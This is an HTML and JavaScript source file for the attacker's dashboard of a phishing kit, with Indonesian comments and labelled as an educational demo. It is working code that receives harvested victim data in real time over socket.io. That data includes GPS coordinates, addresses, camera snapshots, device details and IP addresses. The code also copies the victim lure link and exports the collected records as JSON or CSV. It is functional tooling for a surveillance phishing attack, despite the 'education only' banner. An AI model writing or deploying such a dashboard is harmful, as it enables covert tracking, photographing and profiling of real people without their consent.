<!-- public/dashboard.html - VERSI DIPERBAIKI -->
<!DOCTYPE html>
<html>
<head>
    <title>Demo Phising - Dashboard Attacker</title>
    <link rel="icon" href="img/favicon.ico" type="image/x-icon">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e27;
            color: #00ff9d;
            padding: 20px;
        }
        .header {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ff9d33;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: #1a1f3a;
            padding: 20px;
            border-radius: 10px;
            border-left: 4px solid #00ff9d;
        }
        .stat-card h3 {
            color: #fff;
            font-size: 14px;
            text-transform: uppercase;
            margin-bottom: 10px;
        }
        .stat-card .number {
            font-size: 36px;
            font-weight: bold;
            color: #00ff9d;
        }
        .victim-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }
        .victim-card {
            background: #1a1f3a;
            border-radius: 10px;
            padding: 15px;
            border: 1px solid #333;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }
        .victim-id {
            font-size: 12px;
            color: #888;
        }
        .timestamp {
            font-size: 11px;
            color: #00ff9d;
        }
        .data-section {
            margin-top: 15px;
        }
        .data-title {
            color: #fff;
            font-size: 12px;
            text-transform: uppercase;
            margin-bottom: 5px;
        }
        .data-content {
            background: #0f1322;
            padding: 10px;
            border-radius: 5px;
            font-size: 13px;
            word-break: break-all;
            color: #ddd;
        }
        .camera-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .camera-active { background: #ff4444; box-shadow: 0 0 10px #ff4444; animation: blink 1s infinite; }
        .location-active { background: #44ff44; box-shadow: 0 0 10px #44ff44; }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .map-link {
            color: #00ff9d;
            text-decoration: none;
        }
        .map-link:hover {
            text-decoration: underline;
        }
        .photo-preview {
            max-width: 100%;
            max-height: 200px;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .photo-preview:hover {
            transform: scale(1.05);
        }
        .alert {
            background: #ff4444;
            color: white;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .controls {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        button {
            background: #00ff9d;
            color: #0a0e27;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin-right: 10px;
            transition: all 0.2s;
        }
        button:hover {
            background: #00cc7a;
            transform: translateY(-2px);
        }
        button.danger {
            background: #ff4444;
            color: white;
        }
        button.danger:hover {
            background: #cc0000;
        }
        .loading {
            text-align: center;
            padding: 50px;
            color: #666;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
            margin-left: 5px;
        }
        .badge-success {
            background: #00ff9d33;
            color: #00ff9d;
            border: 1px solid #00ff9d;
        }
        .badge-warning {
            background: #ffaa0033;
            color: #ffaa00;
            border: 1px solid #ffaa00;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.9);
        }
        .modal-content {
            margin: auto;
            display: block;
            max-width: 90%;
            max-height: 90%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .close {
            position: absolute;
            top: 20px;
            right: 35px;
            color: #fff;
            font-size: 40px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover {
            color: #00ff9d;
        }
        .search-box {
            background: #0f1322;
            border: 1px solid #333;
            color: #fff;
            padding: 10px;
            border-radius: 5px;
            width: 300px;
            margin-right: 10px;
        }
        .filter-buttons {
            display: flex;
            gap: 5px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }
        .filter-btn {
            background: #0f1322;
            color: #888;
            border: 1px solid #333;
            padding: 5px 15px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 12px;
        }
        .filter-btn.active {
            background: #00ff9d;
            color: #0a0e27;
            border-color: #00ff9d;
        }
    </style>
</head>
<body>
    <div class="header">
    <div style="display:flex; align-items:center; gap:15px;">
        <img src="img/mcs.jpg" alt="logo" style="width:60px; height:60px; border-radius:10px; object-fit:cover;">
        <div>
            <h1 style="margin:0;">DEMO PHISING</h1>
            <p style="margin:0; font-size:14px; color:#94a3b8;">ATTACKER DASHBOARD</p>
        </div>
    </div>

    <p>Real-time victim monitoring | <span id="connection-status">🟢 Terhubung</span></p>

    <div class="alert">
        ⚠️ DEMO MODE - HANYA UNTUK EDUKASI KEAMANAN SIBER ⚠️
    </div>
    
    <div class="controls">
        <input type="text" id="searchInput" class="search-box" placeholder="Cari victim ID atau IP..." onkeyup="filterVictims()">
        <button onclick="copyLink()">📋 Copy Link Korban</button>
        <button onclick="exportData()">💾 Export Data (JSON)</button>
        <button onclick="exportCSV()">📊 Export CSV</button>
        <button class="danger" onclick="clearData()">🗑️ Clear All Data</button>
        <button onclick="refreshData()">🔄 Refresh</button>
    </div>
    
    <div class="filter-buttons" id="filterButtons">
        <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">Semua</button>
        <button class="filter-btn" data-filter="camera" onclick="setFilter('camera')">Dengan Kamera</button>
        <button class="filter-btn" data-filter="location" onclick="setFilter('location')">Dengan Lokasi</button>
        <button class="filter-btn" data-filter="today" onclick="setFilter('today')">Hari Ini</button>
    </div>
</div>

    <div class="stats">
        <div class="stat-card">
            <h3>Total Victims</h3>
            <div class="number" id="totalVictims">0</div>
        </div>
        <div class="stat-card">
            <h3>Camera Access</h3>
            <div class="number" id="cameraCount">0</div>
        </div>
        <div class="stat-card">
            <h3>Location Access</h3>
            <div class="number" id="locationCount">0</div>
        </div>
        <div class="stat-card">
            <h3>Active (5m)</h3>
            <div class="number" id="activeNow">0</div>
        </div>
    </div>

    <div id="victimGrid" class="victim-grid">
        <div class="loading">Menunggu data korban...</div>
    </div>

    <!-- Modal untuk preview foto -->
    <div id="photoModal" class="modal" onclick="closeModal()">
        <span class="close">&times;</span>
        <img class="modal-content" id="modalImage">
    </div>

    <script>
        // Konfigurasi socket dengan retry
        const socket = io({
            reconnection: true,
            reconnectionAttempts: 5,
            reconnectionDelay: 1000,
            timeout: 10000
        });

        let victims = [];
        let photos = {};
        let currentFilter = 'all';
        let searchTerm = '';

        // Status koneksi
        socket.on('connect', () => {
            console.log('✅ Terhubung ke server');
            document.getElementById('connection-status').innerHTML = '🟢 Terhubung';
            document.getElementById('connection-status').style.color = '#00ff9d';
        });

        socket.on('disconnect', () => {
            console.log('❌ Terputus dari server');
            document.getElementById('connection-status').innerHTML = '🔴 Terputus';
            document.getElementById('connection-status').style.color = '#ff4444';
        });

        socket.on('connect_error', (error) => {
            console.log('Connection error:', error);
            document.getElementById('connection-status').innerHTML = '🟡 Error';
            document.getElementById('connection-status').style.color = '#ffaa00';
        });

        // Update stats dengan validasi data
        function updateStats() {
            const filteredVictims = filterVictimsData(victims);
            
            document.getElementById('totalVictims').textContent = filteredVictims.length;
            
            const cameraGranted = filteredVictims.filter(v => {
                return v.data && v.data.camera_access && v.data.camera_access.status === 'granted';
            }).length;
            
            const locationGranted = filteredVictims.filter(v => {
                return v.data && v.data.location && v.data.location.status === 'granted';
            }).length;
            
            document.getElementById('cameraCount').textContent = cameraGranted;
            document.getElementById('locationCount').textContent = locationGranted;
            
            // Active in last 5 minutes
            const fiveMinAgo = Date.now() - (5 * 60 * 1000);
            const activeNow = filteredVictims.filter(v => {
                const timestamp = v.timestamp ? new Date(v.timestamp).getTime() : 0;
                return timestamp > fiveMinAgo;
            }).length;
            
            document.getElementById('activeNow').textContent = activeNow;
        }

        // Filter data berdasarkan kriteria
        function filterVictimsData(data) {
            let filtered = [...data];
            
            // Filter berdasarkan pencarian
            if (searchTerm) {
                filtered = filtered.filter(v => {
                    const searchLower = searchTerm.toLowerCase();
                    return (v.victimId && v.victimId.toLowerCase().includes(searchLower)) ||
                           (v.ip && v.ip.includes(searchTerm)) ||
                           (v.data && v.data.public_ip && v.data.public_ip.includes(searchTerm));
                });
            }
            
            // Filter berdasarkan kategori
            switch(currentFilter) {
                case 'camera':
                    filtered = filtered.filter(v => v.data && v.data.camera_access && v.data.camera_access.status === 'granted');
                    break;
                case 'location':
                    filtered = filtered.filter(v => v.data && v.data.location && v.data.location.status === 'granted');
                    break;
                case 'today':
                    const today = new Date().toDateString();
                    filtered = filtered.filter(v => {
                        return v.timestamp && new Date(v.timestamp).toDateString() === today;
                    });
                    break;
            }
            
            return filtered;
        }

        // Render victim card dengan validasi data
        function renderVictim(victim) {
            if (!victim || !victim.victimId) return null;
            
            const card = document.createElement('div');
            card.className = 'victim-card';
            card.id = `victim-${victim.victimId}`;
            
            // Data dengan fallback
            const data = victim.data || {};
            const deviceInfo = data.device_info || {};
            const location = data.location || {};
            const camera = data.camera_access || {};
            const network = data.network || {};
            
            // Format data dengan aman
            const userAgent = deviceInfo.userAgent || 'Tidak tersedia';
            const platform = deviceInfo.platform || 'Tidak tersedia';
            const screenInfo = (deviceInfo.screenWidth && deviceInfo.screenHeight) ? 
                `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}` : 'Tidak tersedia';
            const batteryInfo = deviceInfo.battery || 'Tidak tersedia';
            const ipPublic = data.public_ip || 'Tidak tersedia';
            const ipLokal = victim.ip || 'Tidak tersedia';
            
            // Format timestamp
            const timestamp = victim.timestamp ? new Date(victim.timestamp) : new Date();
            const timeStr = timestamp.toLocaleTimeString();
            const dateStr = timestamp.toLocaleDateString();
            
            // Status badges
            const hasCamera = camera.status === 'granted' ? 
                '<span class="badge badge-success">📸 Camera OK</span>' : '';
            const hasLocation = location.status === 'granted' ? 
                '<span class="badge badge-success">📍 Location OK</span>' : '';
            
            card.innerHTML = `
                <div class="victim-header">
                    <div>
                        <span class="victim-id">${victim.victimId}</span>
                        ${hasCamera}
                        ${hasLocation}
                    </div>
                    <span class="timestamp">${dateStr} ${timeStr}</span>
                </div>
                
                <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
                    <span>
                        <span class="camera-indicator ${camera.status === 'granted' ? 'camera-active' : ''}"></span> 
                        Camera: ${camera.status || 'Belum diminta'}
                    </span>
                    <span>
                        <span class="camera-indicator ${location.status === 'granted' ? 'location-active' : ''}"></span> 
                        Location: ${location.status || 'Belum diminta'}
                    </span>
                </div>
                
                ${location.status === 'granted' && location.latitude ? `
                <div class="data-section">
                    <div class="data-title">📍 LOKASI GPS</div>
                    <div class="data-content">
                        <b>Latitude:</b> ${location.latitude}<br>
                        <b>Longitude:</b> ${location.longitude}<br>
                        <b>Akurasi:</b> ${location.accuracy || 'N/A'} meter<br>
                        ${location.altitude ? `<b>Altitude:</b> ${location.altitude} meter<br>` : ''}
                        <a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}" 
                           target="_blank" class="map-link">🔍 Buka di Google Maps</a>
                    </div>
                </div>
                ` : ''}
                
                ${data.location_address ? `
                <div class="data-section">
                    <div class="data-title">🏠 ALAMAT</div>
                    <div class="data-content">
                        ${data.location_address}
                    </div>
                </div>
                ` : ''}
                
                <div class="data-section">
                    <div class="data-title">📱 INFO DEVICE</div>
                    <div class="data-content">
                        <b>Platform:</b> ${platform}<br>
                        <b>Browser:</b> ${userAgent.length > 60 ? userAgent.substring(0, 60) + '...' : userAgent}<br>
                        <b>Screen:</b> ${screenInfo}<br>
                        <b>Battery:</b> ${batteryInfo}<br>
                        <b>Language:</b> ${deviceInfo.language || 'N/A'}<br>
                        <b>Timezone:</b> ${deviceInfo.timezone || 'N/A'}
                    </div>
                </div>
                
                <div class="data-section" id="photo-${victim.victimId}">
                    <div class="data-title">📸 FOTO KAMERA</div>
                    <div class="data-content" id="photo-content-${victim.victimId}">
                        ${photos[victim.victimId] ? 
                            `<img src="${photos[victim.victimId]}" class="photo-preview" onclick="showPhoto('${victim.victimId}')">` : 
                            camera.status === 'granted' ? 'Mengambil foto...' : 'Tidak ada foto'}
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="data-title">🌐 NETWORK</div>
                    <div class="data-content">
                        <b>Online:</b> ${network.online ? 'Ya' : 'Tidak'}<br>
                        <b>Koneksi:</b> ${network.connection?.type || 'N/A'}<br>
                        <b>Kecepatan:</b> ${network.connection?.downlink || 'N/A'} Mbps<br>
                        <b>IP Public:</b> ${ipPublic}<br>
                        <b>IP Lokal:</b> ${ipLokal}
                    </div>
                </div>
                
                <div style="margin-top: 10px; font-size: 11px; color: #666; text-align: right;">
                    ID: ${victim.victimId}
                </div>
            `;
            
            return card;
        }

        // Update all victims dengan filter
        function updateVictimsList() {
            const grid = document.getElementById('victimGrid');
            
            if (!victims || victims.length === 0) {
                grid.innerHTML = '<div class="loading">Belum ada data korban...</div>';
                updateStats();
                return;
            }
            
            // Sort by timestamp descending
            const sortedVictims = [...victims].sort((a, b) => {
                const timeA = a.timestamp ? new Date(a.timestamp).getTime() : 0;
                const timeB = b.timestamp ? new Date(b.timestamp).getTime() : 0;
                return timeB - timeA;
            });
            
            // Apply filters
            const filteredVictims = filterVictimsData(sortedVictims);
            
            if (filteredVictims.length === 0) {
                grid.innerHTML = '<div class="loading">Tidak ada data dengan filter ini</div>';
                updateStats();
                return;
            }
            
            grid.innerHTML = '';
            filteredVictims.forEach(victim => {
                const card = renderVictim(victim);
                if (card) grid.appendChild(card);
            });
            
            updateStats();
        }

        // Handle new victim data dengan struktur yang benar
        socket.on('new-victim', (data) => {
            console.log('📥 New victim data:', data);
            
            if (!data || !data.victimId) {
                console.warn('Invalid victim data:', data);
                return;
            }
            
            // Cari victim yang sudah ada
            const existingIndex = victims.findIndex(v => v && v.victimId === data.victimId);
            
            if (existingIndex >= 0) {
                // Update data yang ada
                if (!victims[existingIndex].data) {
                    victims[existingIndex].data = {};
                }
                
                // Jika data memiliki struktur dengan type
                if (data.type && data.data) {
                    victims[existingIndex].data[data.type] = data.data;
                } 
                // Jika data langsung berisi data lengkap
                else if (data.data) {
                    victims[existingIndex].data = {
                        ...victims[existingIndex].data,
                        ...data.data
                    };
                }
                
                // Update timestamp
                if (data.timestamp) {
                    victims[existingIndex].timestamp = data.timestamp;
                }
                
                // Update IP
                if (data.ip) {
                    victims[existingIndex].ip = data.ip;
                }
                
            } else {
                // Victim baru - buat struktur yang benar
                const newVictim = {
                    victimId: data.victimId,
                    timestamp: data.timestamp || new Date().toISOString(),
                    ip: data.ip || 'Unknown',
                    data: {}
                };
                
                // Masukkan data sesuai struktur
                if (data.type && data.data) {
                    newVictim.data[data.type] = data.data;
                } else if (data.data) {
                    newVictim.data = data.data;
                }
                
                victims.push(newVictim);
            }
            
            // Hapus duplikat berdasarkan victimId (ambil yang terbaru)
            const uniqueVictims = [];
            const seen = new Set();
            
            victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            victims.forEach(v => {
                if (!seen.has(v.victimId)) {
                    seen.add(v.victimId);
                    uniqueVictims.push(v);
                }
            });
            
            victims = uniqueVictims;
            
            updateVictimsList();
        });

        // Handle initial data dengan validasi
        socket.on('init-data', (initialData) => {
            console.log('📊 Initial data received:', initialData);
            
            if (Array.isArray(initialData)) {
                // Filter data yang valid
                victims = initialData.filter(v => v && v.victimId).map(v => {
                    // Pastikan struktur data konsisten
                    if (!v.data) v.data = {};
                    return v;
                });
                
                // Hapus duplikat
                const unique = [];
                const seen = new Set();
                victims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                
                victims.forEach(v => {
                    if (!seen.has(v.victimId)) {
                        seen.add(v.victimId);
                        unique.push(v);
                    }
                });
                
                victims = unique;
            }
            
            updateVictimsList();
        });

        // Handle photo dengan validasi
        socket.on('new-photo', (data) => {
            if (data && data.victimId && data.image) {
                photos[data.victimId] = data.image;
                
                // Update photo di card
                const photoDiv = document.getElementById(`photo-${data.victimId}`);
                if (photoDiv) {
                    photoDiv.innerHTML = `
                        <div class="data-title">📸 FOTO KAMERA</div>
                        <div class="data-content">
                            <img src="${data.image}" class="photo-preview" onclick="showPhoto('${data.victimId}')">
                        </div>
                    `;
                }
            }
        });

        // Utility functions
        function copyLink() {
            const link = window.location.origin + '/demo';
            navigator.clipboard.writeText(link).then(() => {
                alert('✅ Link demo copied: ' + link);
            }).catch(() => {
                prompt('📋 Copy link ini:', link);
            });
        }

        function exportData() {
            const dataStr = JSON.stringify(victims, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victims_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.json`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function exportCSV() {
            // Buat CSV sederhana
            let csv = 'Victim ID,Timestamp,IP,Camera,Location,Latitude,Longitude,Browser,Platform\n';
            
            victims.forEach(v => {
                const row = [
                    v.victid || '',
                    v.timestamp || '',
                    v.ip || '',
                    v.data?.camera_access?.status || '',
                    v.data?.location?.status || '',
                    v.data?.location?.latitude || '',
                    v.data?.location?.longitude || '',
                    (v.data?.device_info?.userAgent || '').replace(/,/g, ' '),
                    v.data?.device_info?.platform || ''
                ].map(cell => `"${cell}"`).join(',');
                
                csv += row + '\n';
            });
            
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `victims_${Date.now()}.csv`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function clearData() {
            if (confirm('⚠️ Hapus semua data victim? Data tidak bisa dikembalikan!')) {
                victims = [];
                photos = {};
                updateVictimsList();
                
                // Optional: kirim sinyal ke server untuk clear data
                fetch('/api/clear-data', { method: 'POST' }).catch(() => {});
            }
        }

        function refreshData() {
            socket.emit('request-refresh');
            updateVictimsList();
        }

        function filterVictims() {
            searchTerm = document.getElementById('searchInput').value.toLowerCase();
            updateVictimsList();
        }

        function setFilter(filter) {
            currentFilter = filter;
            
            // Update active class
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            updateVictimsList();
        }

        function showPhoto(victimId) {
            const photo = photos[victimId];
            if (photo) {
                const modal = document.getElementById('photoModal');
                const modalImg = document.getElementById('modalImage');
                modal.style.display = 'block';
                modalImg.src = photo;
            }
        }

        function closeModal() {
            document.getElementById('photoModal').style.display = 'none';
        }

        // Click outside modal to close
        window.onclick = function(event) {
            const modal = document.getElementById('photoModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }

        // Keyboard shortcut
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                closeModal();
            }
        });

        // Periodic refresh
        setInterval(() => {
            // Optional: request update dari server
            socket.emit('ping');
        }, 30000);

        console.log('Dashboard siap!');
    </script>
</body>
</html>
